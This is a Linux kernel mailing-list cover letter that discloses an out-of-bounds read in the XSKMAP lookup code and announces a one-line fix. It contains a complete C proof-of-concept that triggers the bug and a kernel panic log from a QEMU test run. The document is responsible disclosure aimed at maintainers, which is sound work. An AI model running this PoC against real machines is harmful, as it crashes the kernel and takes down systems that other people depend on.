Received: from mail-pj2-f12.google.com (mail-pj2-f12.google.com [74.125.227.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AD1004A2A64
	for <bpf@vger.kernel.org>; Thu, 10 Sep 2026 16:18:36 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.140
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789057118; cv=none; b=oWf/111JRKvKLN5O6sFuFf+tHAooSB7PF0XBSk8M8/OmdPjRmwzyFn86vTP/ixvoNtEyi87JAp/3K2LGBGpUlSQPlucjD/j9SUM1LVYRuySYoQi56Xcv1Y6Zic07a38Zw0W7mIgngIJxMVa0JJun80EIjh2mXjTSwtKCyA4clak=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789057118; c=relaxed/simple;
	bh=TRnznfs1Pc3iuNSbfRs9/7UZhf/zmXUvU2hsIF8roT0=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=GbaJGte/mbqMp4b19s1AxkNiDB/OZrwBAvz7hFd0cLCWSskeT0ObZwXSoCydphjzoeveNkbA+k5+bGVxMmqGC14Ob2GzgMlhjoIT8UHy+Eio0HXnEevnSenlLcsb1PIumGAFZg/mk1qCp0ZD00g2yf7UNTZqv6XOTQnq40hO6U4=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=e2Y4TcyR; arc=none smtp.client-ip=74.125.227.140
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="e2Y4TcyR"
Received: by mail-pj2-f12.google.com with SMTP id 98e67ed59e1d1-396ccc02279so1484721a91.1
        for <bpf@vger.kernel.org>; Thu, 10 Sep 2026 09:18:36 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1789057116; x=1789661916; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=npapbvURZUJn7dCF72HJkz8R047uORL8VM+rKAaLX80=;
        b=e2Y4TcyRRVpPoBtcVWEQR29Vb22+XeJmoQ76sJ8Oz6lOb5bE0Y3reWHrfDJyS+d0RL
         6Sdnu0DKyWiSqceQIaUB8nNqaDjimOR0MO4ZWE8OZes5IexzCp4yKQhxWErA5sFapoHp
         jSX45rITR7TPXGBAKUqAF8yL3sfvAOhzJ2IH3ay1TMIa8Sjzu8B1hl053jhtIJn6VGAJ
         71xvC8fGdHxIqrvr1zSXJmz40z0XnEukbA9St1YmmX4fIqGxzxUHkDdsRkUAIa8dIgUQ
         5t2qDra5cYwYCvUilkqiurF7hr3HiI7dvZ+BQeFTs0VtmpDrO51A3fHpwxSfrWQnxr56
         YD6A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1789057116; x=1789661916;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=npapbvURZUJn7dCF72HJkz8R047uORL8VM+rKAaLX80=;
        b=OPQX43D5/aMO+lwcjM5iGkmhPV+vSl76JQ3fMIh9vxf9rwqRPzHq5npv1em4ryU/Ug
         yMxeGyZiVxmMBKsSwtAqpfKmj7MnP+dy0C9swVc508yL3iMvwXlT4IV1jCTdn94wDus3
         Vw6asikIbNoxHfbmEWraNCCdbA/L6pXMsehkLjM55qRw8oA4F/HdqYNSKLGgoEWbvZj1
         w61sFsmHURHXPjMTYOg8YIJ14ch6aXleIECciUIWnlL23VU7l/tIAUjQT6Sn/4bTtTju
         MeTbduT0W2bmMw5y4DoDMwBJu88gfedfYfRwn9WbQm5TjA8clUUUqkik3RvvUl3UnfRQ
         y3zg==
X-Forwarded-Encrypted: i=1; AKwUvByWLnhJiBjfOKOIfkFRWoETHrgvowz18VJXwfFvZYexlzliLsPITLnpfsnVzY1agUBxdDI=@vger.kernel.org
X-Gm-Message-State: AFuF++mcf0aZnHhy+pn3w7SHOUxp5QI9EfH9GjSTZ8fAJsaraws3Irn2
	gDphhDR5HhkgZ1j/YfIQBZUp1WV+EydxQKNyaIuhhZkHHe/Rq3vtVTefJIafrIDUX5+w
X-Gm-Gg: AYBFou2xXLjuNylvKauq3gDBLWAlJEcahYvRzvbgo7juqZ7VbUfCkxEIxg+EErIudhh
	KHjaXT2QF7X8IVNXrNSP9X9OLOeIS1bB8gYhGhVJ54CcINfck/lKvaG2RGsV0uJwdkedG/gncVx
	AzxwZ21w+6AYRfjetgrHNuL1MsK7AHt/9rU72Le4olbzOlFgCdI4TTUrpPp0UdtBDhMKqxGQt23
	zaPD7jUiJ2e2olz1n6rAP/cJdI97xhb50T4CEfgCpO2l3UCYEJm6sUgWOLcUWuLjShGslymtvvt
	YISv/YK0D7weDzydM3TuXLSswBa2HgqHQH10M5mCPQ0Hn2iby33hJEpSaYPl0sEFISDT4OgrbkN
	ZVKIFwaUJcOmW61svcHj34N/k/c+7+Tx5SVMwWnekvpUmtqQVv30ym8JBbZ2+rIDzwXbO17+rTu
	Z/SOiP/Q0b/9xf28OAM5LmOxbuucJl/eW2Cuyq9nx9J8kSKAPoL6yWmjbpfchnjqfvSNnZ2iNFD
	XLrx+9E
X-Received: by 2002:a17:90b:4b0e:b0:396:635a:9b10 with SMTP id 98e67ed59e1d1-39d70a159ebmr11326534a91.11.1789057115870;
        Thu, 10 Sep 2026 09:18:35 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([2602:feda:30:ae86:295:dff:fe84:68f4])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-339770f0489sm24262327eec.8.2026.09.10.09.18.30
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 10 Sep 2026 09:18:35 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netdev@vger.kernel.org,
	bpf@vger.kernel.org
Cc: magnus.karlsson@intel.com,
	maciej.fijalkowski@intel.com,
	sdf@fomichev.me,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	ast@kernel.org,
	daniel@iogearbox.net,
	hawk@kernel.org,
	john.fastabend@gmail.com,
	jonathan.lemon@gmail.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH bpf 0/1] xsk: use a 32-bit compare in xsk_map_gen_lookup
Date: Fri, 11 Sep 2026 00:18:23 +0800
Message-ID: <cover.1789056660.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/xdp/xskmap.c. The bug is
reachable by a root user.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug in this email, along
with a PoC to trigger it.

---- details below ----

Bug details:

xsk_map_gen_lookup() loads a 32-bit map key and compares it against
max_entries with BPF_JMP_IMM. BPF immediates are sign-extended to 64
bits. When max_entries is 0x80000000 or higher, that threshold becomes
larger than every zero-extended u32 key, so an out-of-range index still
passes the check. The generated lookup then scales the key and reads a
pointer past the end of xsk_map[].

The fix uses BPF_JMP32_IMM so the bounds check stays a 32-bit unsigned
compare.

Reproducer:

    gcc -O2 -Wall -Wextra -o poc poc.c
    ./poc

The PoC allocates an XSKMAP with max_entries=0x80000000, so the guest
needs enough RAM for the backing array (about 16 GiB).

We run the PoC in a 2 vCPU, 32 GB RAM x86 QEMU environment.

------BEGIN poc.c------

    #define _GNU_SOURCE
    
    #include <errno.h>
    #include <linux/bpf.h>
    #include <linux/unistd.h>
    #include <stdint.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/resource.h>
    #include <sys/syscall.h>
    #include <unistd.h>
    
    #ifndef BPF_PSEUDO_MAP_FD
    #define BPF_PSEUDO_MAP_FD 1
    #endif
    
    #define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
    
    #define LOG_BUF_SIZE (1U << 20)
    #define XSKMAP_MAX_ENTRIES 0x80000000u
    #define TRIGGER_KEY (XSKMAP_MAX_ENTRIES + 512u)
    
    #define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)                          \
    	((struct bpf_insn) {                                            \
    		.code = CODE,                                            \
    		.dst_reg = DST,                                          \
    		.src_reg = SRC,                                          \
    		.off = OFF,                                              \
    		.imm = IMM,                                              \
    	})
    
    #define BPF_MOV64_IMM(DST, IMM)                                          \
    	BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)
    
    #define BPF_MOV64_REG(DST, SRC)                                          \
    	BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)
    
    #define BPF_ALU64_IMM(OP, DST, IMM)                                      \
    	BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)
    
    #define BPF_STX_MEM(SIZE, DST, SRC, OFF)                                 \
    	BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)
    
    #define BPF_EXIT_INSN()                                                  \
    	BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)
    
    #define BPF_EMIT_CALL(FUNC)                                              \
    	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, FUNC)
    
    #define BPF_LD_IMM64_RAW(DST, SRC, IMM)                                  \
    	BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM, DST, SRC, 0, (__u32)(IMM)), \
    	BPF_RAW_INSN(0, 0, 0, 0, ((__u64)(IMM)) >> 32)
    
    #define BPF_LD_MAP_FD(DST, MAP_FD)                                       \
    	BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
    
    static int sys_bpf(enum bpf_cmd cmd, union bpf_attr *attr)
    {
    	return syscall(__NR_bpf, cmd, attr, sizeof(*attr));
    }
    
    static void raise_memlock_limit(void)
    {
    	struct rlimit lim = {
    		.rlim_cur = RLIM_INFINITY,
    		.rlim_max = RLIM_INFINITY,
    	};
    
    	if (setrlimit(RLIMIT_MEMLOCK, &lim) && errno != EPERM)
    		perror("setrlimit(RLIMIT_MEMLOCK)");
    }
    
    static int create_xskmap(void)
    {
    	union bpf_attr attr = {
    		.map_type = BPF_MAP_TYPE_XSKMAP,
    		.key_size = sizeof(uint32_t),
    		.value_size = sizeof(uint32_t),
    		.max_entries = XSKMAP_MAX_ENTRIES,
    	};
    
    	return sys_bpf(BPF_MAP_CREATE, &attr);
    }
    
    static int load_prog(int map_fd, char *log_buf, size_t log_buf_sz)
    {
    	static const char license[] = "GPL";
    	struct bpf_insn prog[] = {
    		BPF_MOV64_IMM(BPF_REG_6, (__s32)TRIGGER_KEY),
    		BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_6, -4),
    		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
    		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
    		BPF_LD_MAP_FD(BPF_REG_1, map_fd),
    		BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    		BPF_MOV64_IMM(BPF_REG_0, XDP_DROP),
    		BPF_EXIT_INSN(),
    	};
    	union bpf_attr attr = {
    		.prog_type = BPF_PROG_TYPE_XDP,
    		.insn_cnt = (__u32)ARRAY_SIZE(prog),
    		.insns = (__u64)(uintptr_t)prog,
    		.license = (__u64)(uintptr_t)license,
    		.log_buf = (__u64)(uintptr_t)log_buf,
    		.log_size = (__u32)log_buf_sz,
    		.log_level = 2,
    	};
    
    	memset(log_buf, 0, log_buf_sz);
    	return sys_bpf(BPF_PROG_LOAD, &attr);
    }
    
    static int run_prog(int prog_fd)
    {
    	uint8_t pkt[64] = {0};
    	union bpf_attr attr = {
    		.test = {
    			.prog_fd = prog_fd,
    			.data_in = (__u64)(uintptr_t)pkt,
    			.data_size_in = sizeof(pkt),
    			.repeat = 1,
    		},
    	};
    
    	return sys_bpf(BPF_PROG_TEST_RUN, &attr);
    }
    
    int main(void)
    {
    	static char log_buf[LOG_BUF_SIZE];
    	unsigned long long map_bytes =
    		(unsigned long long)XSKMAP_MAX_ENTRIES * sizeof(uint64_t);
    	int prog_fd;
    	int map_fd;
    	int ret;
    
    	printf("creating XSKMAP with max_entries=0x%08x (~%llu GiB backing array)\n",
    	       XSKMAP_MAX_ENTRIES, map_bytes >> 30);
    	printf("trigger key=0x%08x\n", TRIGGER_KEY);
    
    	raise_memlock_limit();
    
    	map_fd = create_xskmap();
    	if (map_fd < 0) {
    		fprintf(stderr, "BPF_MAP_CREATE failed: %s\n", strerror(errno));
    		return 1;
    	}
    
    	printf("map_fd=%d\n", map_fd);
    
    	prog_fd = load_prog(map_fd, log_buf, sizeof(log_buf));
    	if (prog_fd < 0) {
    		fprintf(stderr, "BPF_PROG_LOAD failed: %s\n", strerror(errno));
    		if (log_buf[0] != '\0')
    			fprintf(stderr, "verifier log:\n%s\n", log_buf);
    		close(map_fd);
    		return 1;
    	}
    
    	printf("prog_fd=%d\n", prog_fd);
    	printf("running BPF_PROG_TEST_RUN; a successful trigger should oops/panic the kernel\n");
    	fflush(stdout);
    
    	ret = run_prog(prog_fd);
    	if (ret < 0) {
    		fprintf(stderr, "BPF_PROG_TEST_RUN returned: %s\n", strerror(errno));
    		close(prog_fd);
    		close(map_fd);
    		return 1;
    	}
    
    	printf("BPF_PROG_TEST_RUN unexpectedly completed without a crash\n");
    	close(prog_fd);
    	close(map_fd);
    	return 0;
    }
------END poc.c--------

----BEGIN crash log----

[  942.704399][  T993] BUG: unable to handle page fault for address: ffffc904033ca238
[  942.706192][  T993] #PF: supervisor read access in kernel mode
[  942.707018][  T993] #PF: error_code(0x0000) - not-present page
[  942.707828][  T993] PGD 100000067 P4D 100000067 PUD 12ec36067 PMD 15d148067 PTE 0
[  942.709159][  T993] Oops: Oops: 0000 [#1] SMP KASAN NOPTI
[  942.710171][  T993] CPU: 1 UID: 0 PID: 993 Comm: poc Not tainted 6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
[  942.711972][  T993] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  942.714054][  T993] RIP: 0010:bpf_prog_1e67334305173a00+0x51/0x65
[  942.715178][  T993] Code: 89 ee 48 83 c6 fc 48 bf 00 90 3c 03 00 c9 ff ff 8b 46 00 48 81 f8 00 00 00 80 73 14 48 c1 e0 03 48 81 c7 38 02 00 00 48 01 f8 <48> 8b 40 00 eb 02 31 c0 b8 01 00 00 00 5b c9 e9 d6 63 0f c6 cc cc
[  942.718505][  T993] RSP: 0018:ffffc90003327918 EFLAGS: 00010282
[  942.719534][  T993] RAX: ffffc904033ca238 RBX: ffffffff80000200 RCX: ffff88818d9f6638
[  942.720713][  T993] RDX: ffffffffc000dcd0 RSI: ffffc90003327924 RDI: ffffc900033c9238
[  942.722000][  T993] RBP: ffffc90003327928 R08: 0000000000000001 R09: fffffbfff13162d0
[  942.723085][  T993] R10: ffffffff898b1687 R11: 0000000000000001 R12: ffffc90003327a80
[  942.724473][  T993] R13: ffffc90003327c00 R14: ffffc900022ab000 R15: ffffed1031b3ecc7
[  942.725727][  T993] FS:  00007ebe6c6e1740(0000) GS:ffff8887dde00000(0000) knlGS:0000000000000000
[  942.727239][  T993] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  942.728374][  T993] CR2: ffffc904033ca238 CR3: 000000012ec4e002 CR4: 0000000000770ef0
[  942.729735][  T993] PKRU: 55555554
[  942.730344][  T993] Call Trace:
[  942.730949][  T993]  <TASK>
[  942.731465][  T993]  bpf_test_run+0x2e3/0x970
[  942.732388][  T993]  ? bpf_test_run+0x261/0x970
[  942.733225][  T993]  ? __pfx_bpf_test_run+0x10/0x10
[  942.734109][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
[  942.735102][  T993]  ? local_clock_noinstr+0x15/0xd0
[  942.736014][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
[  942.736885][  T993]  ? lock_release+0x687/0xc90
[  942.737760][  T993]  ? __pfx_lock_release+0x10/0x10
[  942.738769][  T993]  ? lock_acquire+0x153/0x2f0
[  942.739718][  T993]  ? __virt_addr_valid+0x12a/0x2c0
[  942.740704][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
[  942.741782][  T993]  ? _copy_from_user+0x42/0xa0
[  942.742779][  T993]  bpf_prog_test_run_xdp+0x7d0/0x1640
[  942.743820][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
[  942.744724][  T993]  ? pipe_write+0xf8e/0x1a40
[  942.745411][  T993]  ? __pfx_bpf_prog_test_run_xdp+0x10/0x10
[  942.746199][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
[  942.746956][  T993]  ? fdget+0x51/0x1d0
[  942.747516][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
[  942.748278][  T993]  __sys_bpf+0x7a8/0x3c50
[  942.748895][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
[  942.749659][  T993]  ? security_file_permission+0x7e/0xe0
[  942.750446][  T993]  ? __pfx___sys_bpf+0x10/0x10
[  942.751091][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
[  942.751854][  T993]  ? vfs_write+0x9d2/0xf90
[  942.752473][  T993]  ? reacquire_held_locks+0x204/0x4b0
[  942.753201][  T993]  ? do_user_addr_fault+0x45b/0xbc0
[  942.753918][  T993]  ? __pfx_vfs_write+0x10/0x10
[  942.754606][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
[  942.755371][  T993]  ? ksys_write+0x17c/0x1d0
[  942.755981][  T993]  ? __pfx_ksys_write+0x10/0x10
[  942.756652][  T993]  __x64_sys_bpf+0x78/0xc0
[  942.757256][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
[  942.758020][  T993]  ? trace_hardirqs_on+0x5b/0x110
[  942.758780][  T993]  do_syscall_64+0x6f/0x150
[  942.759412][  T993]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[  942.760252][  T993] RIP: 0033:0x7ebe6c7f27b9
[  942.761020][  T993] Code: ff c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 27 66 0d 00 f7 d8 64 89 01 48
[  942.764184][  T993] RSP: 002b:00007ffeca1975a8 EFLAGS: 00000246 ORIG_RAX: 0000000000000141
[  942.765291][  T993] RAX: ffffffffffffffda RBX: 0000000000000004 RCX: 00007ebe6c7f27b9
[  942.766258][  T993] RDX: 0000000000000098 RSI: 00007ffeca197600 RDI: 000000000000000a
[  942.767315][  T993] RBP: 00007ffeca197600 R08: 0000000000000000 R09: 0000000000000000
[  942.768286][  T993] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
[  942.769253][  T993] R13: 0000000000000003 R14: 00005833505e80c0 R15: 00005833505e7dd8
[  942.770237][  T993]  </TASK>
[  942.770623][  T993] Modules linked in:
[  942.771151][  T993] CR2: ffffc904033ca238
[  942.771682][  T993] ---[ end trace 0000000000000000 ]---
[  942.772356][  T993] RIP: 0010:bpf_prog_1e67334305173a00+0x51/0x65
[  942.773129][  T993] Code: 89 ee 48 83 c6 fc 48 bf 00 90 3c 03 00 c9 ff ff 8b 46 00 48 81 f8 00 00 00 80 73 14 48 c1 e0 03 48 81 c7 38 02 00 00 48 01 f8 <48> 8b 40 00 eb 02 31 c0 b8 01 00 00 00 5b c9 e9 d6 63 0f c6 cc cc
[  942.775176][  T993] RSP: 0018:ffffc90003327918 EFLAGS: 00010282
[  942.775889][  T993] RAX: ffffc904033ca238 RBX: ffffffff80000200 RCX: ffff88818d9f6638
[  942.776785][  T993] RDX: ffffffffc000dcd0 RSI: ffffc90003327924 RDI: ffffc900033c9238
[  942.777694][  T993] RBP: ffffc90003327928 R08: 0000000000000001 R09: fffffbfff13162d0
[  942.778655][  T993] R10: ffffffff898b1687 R11: 0000000000000001 R12: ffffc90003327a80
[  942.779544][  T993] R13: ffffc90003327c00 R14: ffffc900022ab000 R15: ffffed1031b3ecc7
[  942.780520][  T993] FS:  00007ebe6c6e1740(0000) GS:ffff8887dde00000(0000) knlGS:0000000000000000
[  942.781552][  T993] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  942.782325][  T993] CR2: ffffc904033ca238 CR3: 000000012ec4e002 CR4: 0000000000770ef0
[  942.783299][  T993] PKRU: 55555554
[  942.783738][  T993] Kernel panic - not syncing: Fatal exception in interrupt
[  942.784962][  T993] Kernel Offset: disabled
[  942.785472][  T993] Rebooting in 10 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  xsk: use a 32-bit compare in xsk_map_gen_lookup

 net/xdp/xskmap.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

-- 
2.43.0
